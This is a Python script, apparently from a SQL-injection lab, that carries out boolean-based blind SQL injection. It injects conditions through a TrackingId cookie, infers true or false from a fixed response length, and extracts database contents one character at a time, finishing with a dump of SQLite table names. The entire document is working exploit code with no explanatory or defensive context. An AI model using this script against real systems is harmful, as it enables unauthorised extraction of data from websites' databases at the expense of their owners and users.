import urllib.request, string

url = "http://your-site/"
chars = string.ascii_letters + string.digits + "{}_-@./:="

def check(sql_cond):
    payload = f"base-tracking-id-123' AND ({sql_cond})--"
    req = urllib.request.Request(url)
    req.add_header("Cookie", f"TrackingId={payload}")
    try:
        with urllib.request.urlopen(req) as resp:
            return len(resp.read()) == 5652
    except Exception:
        return False

def dump_query(query_expr):
    res = ""
    while True:
        found = False
        for c in chars:
            pos = len(res) + 1
            cond = f"SUBSTR(({query_expr}), {pos}, 1) = '{c}'"
            if check(cond):
                res += c
                found = True
                print(res, flush=True)
                break
        if not found:
            break
    return res

print("Tables:", dump_query("SELECT group_concat(tbl_name, ',') FROM sqlite_master WHERE type='table'"))
